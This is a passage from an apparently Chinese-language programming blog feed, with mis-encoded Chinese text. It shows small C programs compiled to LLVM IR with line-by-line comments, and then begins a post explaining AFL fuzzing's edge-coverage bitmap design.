punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        a <span class="token operator">+=</span> i<span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token number">15</span><span class="token operator">:</span>                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = 25, i =  %d\n "</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">105</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = 105, i=  %d\n "</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">990</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = 990, i =  %d\n "</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-none"><code class="language-none">#switch.ll; ModuleID &#x3D; &#39;switch.c&#39;source_filename &#x3D; &quot;switch.c&quot;target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;@.str &#x3D; private unnamed_addr constant [18 x i8] c&quot;a &#x3D; 25, i &#x3D;  %d\0A \00&quot;, align 1@.str.1 &#x3D; private unnamed_addr constant [19 x i8] c&quot;a &#x3D;  105, i&#x3D;  %d\0A \00&quot;, align 1@.str.2 &#x3D; private unnamed_addr constant [19 x i8] c&quot;a &#x3D; 990, i &#x3D;  %d\0A \00&quot;, align 1@.str.3 &#x3D; private unnamed_addr constant [4 x i8] c&quot;%d\0A\00&quot;, align 1; Function Attrs: noinline nounwind optnone uwtabledefine dso_local i32 @main() #0 &#123;  %1 &#x3D; alloca i32, align 4  %2 &#x3D; alloca i32, align 4  %3 &#x3D; alloca i32, align 4  store i32 0, i32* %1, align 4  store i32 1, i32* %2, align 4  store i32 0, i32* %3, align 4  br label %4 ; è¿›å…¥forå¾ªç¯å…¥å£# forå¾ªç¯å…¥å£4:                                                ; preds &#x3D; %22, %0  %5 &#x3D; load i32, i32* %2, align 4  %6 &#x3D; icmp sle i32 %5, 50  br i1 %6, label %7, label %25; forå¾ªç¯ body7:                                                ; preds &#x3D; %4  %8 &#x3D; load i32, i32* %2, align 4  %9 &#x3D; load i32, i32* %3, align 4  %10 &#x3D; add nsw i32 %9, %8  store i32 %10, i32* %3, align 4  %11 &#x3D; load i32, i32* %3, align 4  switch i32 %11, label %21 [ ; switch åˆ¤æ–­a    i32 15, label %12    i32 105, label %15    i32 990, label %18  ]; label %1212:                                               ; preds &#x3D; %7  %13 &#x3D; load i32, i32* %2, align 4  %14 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0), i32 noundef %13)  br label %21; label %1215:                                               ; preds &#x3D; %7  %16 &#x3D; load i32, i32* %2, align 4  %17 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i32 noundef %16)  br label %21; label %1218:                                               ; preds &#x3D; %7  %19 &#x3D; load i32, i32* %2, align 4  %20 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0), i32 noundef %19)  br label %2121:                                               ; preds &#x3D; %7, %18, %15, %12  br label %22; for å¾ªç¯å°¾éƒ¨+122:                                               ; preds &#x3D; %21  %23 &#x3D; load i32, i32* %2, align 4  %24 &#x3D; add nsw i32 %23, 1  store i32 %24, i32* %2, align 4  br label %4, !llvm.loop !425:                                               ; preds &#x3D; %4  %26 &#x3D; load i32, i32* %3, align 4  %27 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0), i32 noundef %26)  ret i32 0&#125;declare dso_local i32 @printf(i8* noundef, ...) #1attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;attributes #1 &#x3D; &#123; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;!llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125;!llvm.ident &#x3D; !&#123;!3&#125;!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;!1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;!2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;!3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125;!4 &#x3D; distinct !&#123;!4, !5&#125;!5 &#x3D; !&#123;!&quot;llvm.loop.mustprogress&quot;&#125;</code></pre><h3 id="6-ç»“æ„ä½“">6. ç»“æ„ä½“</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//struct.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token keyword">struct</span> <span class="token class-name">People</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>num<span class="token punctuation">;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Class</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">People</span> people<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">Class</span> class<span class="token punctuation">;</span>    class<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    class<span class="token punctuation">.</span>people<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token string">"211501"</span><span class="token punctuation">;</span>    class<span class="token punctuation">.</span>people<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">22</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>class<span class="token punctuation">.</span>people<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"id = %d ; age = %d ; num = %s; name = %s\n"</span><span class="token punctuation">,</span>class<span class="token punctuation">.</span>id<span class="token punctuation">,</span>class<span class="token punctuation">.</span>people<span class="token punctuation">.</span>age<span class="token punctuation">,</span>class<span class="token punctuation">.</span>people<span class="token punctuation">.</span>num<span class="token punctuation">,</span>class<span class="token punctuation">.</span>people<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯è¯»<code>struct.ll</code>æ–‡ä»¶</p><pre class="language-none"><code class="language-none">; ModuleID &#x3D; &#39;struct.c&#39;source_filename &#x3D; &quot;struct.c&quot;target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;%struct.Class &#x3D; type &#123; i32, %struct.People &#125;%struct.People &#x3D; type &#123; i8*, i32, [10 x i8] &#125; ; i32ç±»å‹ 10*i8çš„ç©ºé—´@.str &#x3D; private unnamed_addr constant [7 x i8] c&quot;211501\00&quot;, align 1@.str.1 &#x3D; private unnamed_addr constant [5 x i8] c&quot;test\00&quot;, align 1@.str.2 &#x3D; private unnamed_addr constant [42 x i8] c&quot;id &#x3D; %d ; age &#x3D; %d ; num &#x3D; %s; name &#x3D; %s\0A\00&quot;, align 1; Function Attrs: noinline nounwind optnone uwtabledefine dso_local i32 @main() #0 &#123;  %1 &#x3D; alloca i32, align 4  %2 &#x3D; alloca %struct.Class, align 8 ; åˆ†é…%struct.Classç©ºé—´ç»™%2  store i32 0, i32* %1, align 4  ; æŒ‡ä»¤æ¥è·å¾—æŒ‡å‘æ•°ç»„çš„å…ƒç´ å’ŒæŒ‡å‘ç»“æ„ä½“æˆå‘˜çš„æŒ‡é’ˆ  ; è·å–classç¬¬ä¸€ä¸ªæˆå‘˜çš„æŒ‡é’ˆç»™%3 å³ int id;  %3 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 0  ; åˆ†é…1ç»™æŒ‡é’ˆ%3 å³ class.id &#x3D; 1  store i32 1, i32* %3, align 8  ; è·å–classçš„ç¬¬äºŒä¸ªæˆå‘˜æŒ‡é’ˆç»™%4 å³ struct People people;  %4 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1  ; è·å–class.peopleç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜æŒ‡é’ˆç»™%5  %5 &#x3D; getelementptr inbounds %struct.People, %struct.People* %4, i32 0, i32 0  ; åˆ†é…@.strçš„å†…å®¹ç»™%5 å³ class.people.num &#x3D; &quot;211501&quot;;  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %5, align 8  ; è·å–classç»“æ„ä½“çš„ç¬¬äºŒä¸ªæˆå‘˜æŒ‡é’ˆç»™%6 å³ struct People people;  %6 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1  ; è·å–class.peopleç»“æ„ä½“çš„ç¬¬äºŒä¸ªæˆå‘˜æŒ‡é’ˆç»™%7 å³ int age;  %7 &#x3D; getelementptr inbounds %struct.People, %struct.People* %6, i32 0, i32 1  ; åˆ†é… 22 ç»™ %7 æŒ‡é’ˆæŒ‡å‘åœ°å€ å³ class.people.age &#x3D; 22;  store i32 22, i32* %7, align 8  ; è·å–classç»“æ„ä½“çš„ç¬¬äºŒä¸ªæˆå‘˜æŒ‡é’ˆç»™%8 å³ struct People people;  %8 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1  ; è·å–class.peopleç»“æ„ä½“çš„ç¬¬ä¸‰ä¸ªæˆå‘˜æŒ‡é’ˆç»™%9 å³ char name[10];;  %9 &#x3D; getelementptr inbounds %struct.People, %struct.People* %8, i32 0, i32 2  ; è·å–%9æŒ‡é’ˆæŒ‡å‘çš„ç¬¬ä¸€ä¸ªåœ°å€  %10 &#x3D; getelementptr inbounds [10 x i8], [10 x i8]* %9, i64 0, i64 0  ; è°ƒç”¨strcpyå‡½æ•° åˆ†é…@.str.1  %11 &#x3D; call i8* @strcpy(i8* noundef %10, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0)) #3  ; ä¸ºäº†è¾“å‡ºprintf åšå‡†å¤‡  %12 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 0  %13 &#x3D; load i32, i32* %12, align 8  %14 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1  %15 &#x3D; getelementptr inbounds %struct.People, %struct.People* %14, i32 0, i32 1  %16 &#x3D; load i32, i32* %15, align 8  %17 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1  %18 &#x3D; getelementptr inbounds %struct.People, %struct.People* %17, i32 0, i32 0  %19 &#x3D; load i8*, i8** %18, align 8  %20 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1  %21 &#x3D; getelementptr inbounds %struct.People, %struct.People* %20, i32 0, i32 2  %22 &#x3D; getelementptr inbounds [10 x i8], [10 x i8]* %21, i64 0, i64 0  %23 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0), i32 noundef %13, i32 noundef %16, i8* noundef %19, i8* noundef %22)  ret i32 0&#125;; Function Attrs: nounwinddeclare dso_local i8* @strcpy(i8* noundef, i8* noundef) #1declare dso_local i32 @printf(i8* noundef, ...) #2attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;attributes #1 &#x3D; &#123; nounwind &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;attributes #2 &#x3D; &#123; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;attributes #3 &#x3D; &#123; nounwind &#125;!llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125;!llvm.ident &#x3D; !&#123;!3&#125;!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;!1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;!2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;!3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125;</code></pre><p><font color='cornflowerblue'>ç»“æ„ä½“å’Œæ•°ç»„éœ€è¦ç°ä½¿ç”¨<code>getelementptr</code> è·å–æŒ‡å‘æ•°ç»„æˆ–ç»“æ„æˆå‘˜çš„æŒ‡é’ˆï¼Œç„¶åæ ¹æ®æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹è¿›è¡Œèµ‹å€¼æˆ–åšè¿ç®—</font></p><h3 id="7-ç‰›åˆ€å°è¯•">7. ç‰›åˆ€å°è¯•</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//main.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"plz input two numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> bufsize <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>bufsize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bufsize<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">double</span> f1 <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bufsize<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">double</span> f2 <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2f + %.2f = %.2f \n"</span><span class="token punctuation">,</span> f1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f1<span class="token operator">+</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è½¬æ¢æˆå¯è¯» <code>ll</code>æ–‡ä»¶</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ clang -emit-llvm -S main.c -o main.ll</code></pre><pre class="language-none"><code class="language-none">; ModuleID &#x3D; &#39;main.c&#39;source_filename &#x3D; &quot;main.c&quot;target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;%struct._IO_FILE &#x3D; type &#123; i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] &#125;%struct._IO_marker &#x3D; type opaque%struct._IO_codecvt &#x3D; type opaque%struct._IO_wide_data &#x3D; type opaque@.str &#x3D; private unnamed_addr constant [22 x i8] c&quot;plz input two numbers\00&quot;, align 1@stdin &#x3D; external dso_local global %struct._IO_FILE*, align 8@.str.1 &#x3D; private unnamed_addr constant [21 x i8] c&quot;%.2f + %.2f &#x3D; %.2f \0A\00&quot;, align 1; Function Attrs: noinline nounwind optnone uwtabledefine dso_local i32 @main() #0 &#123;  %1 &#x3D; alloca i32, align 4 ; åˆ†é…ç©ºé—´  %2 &#x3D; alloca i64, align 8 ; åˆ†é…ç©ºé—´  %3 &#x3D; alloca i8*, align 8 ; åˆ†é…ç©ºé—´  %4 &#x3D; alloca double, align 8 ; åˆ†é…ç©ºé—´  %5 &#x3D; alloca double, align 8 ; åˆ†é…ç©ºé—´  store i32 0, i32* %1, align 4 ; åˆ†é…é»˜è®¤å€¼0  ; è°ƒç”¨è¾“å‡º  %6 &#x3D; call i32 @puts(i8* noundef getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0))  store i64 100, i64* %2, align 8 ; å­˜å‚¨100 åˆ° i64æŒ‡é’ˆ%2  %7 &#x3D; load i64, i64* %2, align 8  %8 &#x3D; call noalias i8* @malloc(i64 noundef %7) #4 ; åŠ¨æ€åˆ†é…å†…å­˜å¤§å°ä¸º%7çš„ç©ºé—´  store i8* %8, i8** %3, align 8 ; å°†åˆ†é…çš„ç©ºé—´å­˜åˆ°%3æŒ‡é’ˆ  %9 &#x3D; load %struct._IO_FILE*, %struct._IO_FILE** @stdin, align 8  ; è¾“å…¥çš„%9   %10 &#x3D; call i64 @getline(i8** noundef %3, i64* noundef %2, %struct._IO_FILE* noundef %9)   %11 &#x3D; load i8*, i8** %3, align 8  %12 &#x3D; call double @atof(i8* noundef %11) #5  store double %12, double* %4, align 8  %13 &#x3D; load %struct._IO_FILE*, %struct._IO_FILE** @stdin, align 8  %14 &#x3D; call i64 @getline(i8** noundef %3, i64* noundef %2, %struct._IO_FILE* noundef %13)  %15 &#x3D; load i8*, i8** %3, align 8  %16 &#x3D; call double @atof(i8* noundef %15) #5  store double %16, double* %5, align 8  %17 &#x3D; load double, double* %4, align 8  %18 &#x3D; load double, double* %5, align 8  %19 &#x3D; load double, double* %4, align 8  %20 &#x3D; load double, double* %5, align 8  %21 &#x3D; fadd double %19, %20  %22 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), double noundef %17, double noundef %18, double noundef %21)  %23 &#x3D; load i8*, i8** %3, align 8  call void @free(i8* noundef %23) #4  ret i32 0&#125;declare dso_local i32 @puts(i8* noundef) #1; Function Attrs: nounwinddeclare dso_local noalias i8* @malloc(i64 noundef) #2declare dso_local i64 @getline(i8** noundef, i64* noundef, %struct._IO_FILE* noundef) #1; Function Attrs: nounwind readonly willreturndeclare dso_local double @atof(i8* noundef) #3declare dso_local i32 @printf(i8* noundef, ...) #1; Function Attrs: nounwinddeclare dso_local void @free(i8* noundef) #2attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;attributes #1 &#x3D; &#123; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;attributes #2 &#x3D; &#123; nounwind &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;attributes #3 &#x3D; &#123; nounwind readonly willreturn &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125;attributes #4 &#x3D; &#123; nounwind &#125;attributes #5 &#x3D; &#123; nounwind readonly willreturn &#125;!llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125;!llvm.ident &#x3D; !&#123;!3&#125;!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;!1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;!2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;!3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125;</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL(american Fuzzy Lop)å­¦ä¹ äºŒ</title>
      <link href="/posts/3594e8de/"/>
      <url>/posts/3594e8de/</url>
      
        <content type="html"><![CDATA[<h1>AFL(american fuzzy lop)å­¦ä¹ äºŒ</h1><blockquote><p>@sizaif</p><p>@2022-04-10</p></blockquote><h2 id="è®¾è®¡æ€æƒ³">è®¾è®¡æ€æƒ³</h2><div class="story post-story"><h3 id="è¦†ç›–ç‡è®¡ç®—">è¦†ç›–ç‡è®¡ç®—</h3><p><strong>æ”¹è¿›è¾¹ç¼˜è¦†ç›–ï¼š</strong></p><blockquote><p>å‘ç›®æ ‡ç¨‹åºæ³¨å…¥ä»¥ä¸‹å·¥å…·æ¥æ•è·åˆ†æ”¯(è¾¹ç¼˜)è¦†ç›–ç‡å’Œåˆ†æ”¯å‘½ä¸­è®¡æ•°</p><ul><li>ä¸€æ¡è¾¹è¡¨ç¤ºä¸ºå½“å‰åŸºæœ¬å—(åˆ†é…äº†ä¸€ä¸ªéšæœºå¸¸æ•°)ä¸å‰ä¸€ä¸ªåŸºæœ¬å—(å³å…ƒç»„ (prev_location, cur_location))ä¹‹é—´çš„ XOR</li><li>è¦†ç›–ä¿¡æ¯å­˜å‚¨åœ¨ä¸€ä¸ªç´§å‡‘å…±äº«çš„64KBçš„å“ˆå¸Œè¡¨ä¸­ï¼Œç§°ä¸ºè·Ÿè¸ªä½å›¾(bitmap)</li><li>å½“è®¿é—®ä¸€æ¡è¾¹æ—¶ï¼Œé€šè¿‡å¢åŠ ä¸è¯¥ç‰¹å®šè¾¹çš„å“ˆå¸Œç›¸å¯¹åº”çš„ä½å›¾ä¸­çš„å€¼æ¥è®°å½•å‘½ä¸­</li></ul></blockquote><pre class="language-c++" data-language="c++"><code class="language-c++">cur_location &#x3D; &lt;COMPILE_TIME_RANDOM&gt;; # cur_location å€¼æ˜¯éšæœºç”Ÿæˆçš„ï¼Œä»¥ç®€åŒ–é“¾æ¥å¤æ‚é¡¹ç›®çš„è¿‡ç¨‹å¹¶ä¿æŒ XOR è¾“å‡ºå‡åŒ€åˆ†å¸ƒã€‚shared_mem[cur_location ^ prev_location]++; # ç”±è°ƒç”¨è€…ä¼ é€’ç»™æ£€æµ‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚prev_location &#x3D; cur_location &gt;&gt; 1; # ä¿æŒå…ƒç»„çš„æ–¹å‘æ€§ ä»¥åŒºåˆ† A^B å’Œ B^A ,å¹¶ä¿æŒç´§å¯†å¾ªç¯çš„æ ‡è¯†,åŒºåˆ†A^A,B^B</code></pre><p><img src="https://s2.loli.net/2022/04/09/TROMyG8FarhglDu.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/TROMyG8FarhglDu.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409092606122"></p><p>**ç®€å•å—è®¡ç®—å­˜åœ¨çš„é—®é¢˜ï¼š**å¯¹å·²æ‰§è¡Œçš„åŸºæœ¬å—è¿›è¡ŒæŠ€æœ¯ä¼šå¯¼è‡´ä¿¡æ¯ä¸¢å¤±</p><p>ä¾‹å¦‚ï¼š å·²æ‰§è¡Œ BB1-&gt;BB2-&gt;BB3-&gt;BB4ï¼Œ  æ–°çš„è·¯å¾„ï¼š BB1-&gt;BB2-&gt;BB4,  BB1-&gt;BB2-&gt;BB3 æœªè¢«è®¡å…¥ï¼Œè·¯å¾„ä¸¢å¤±</p><img 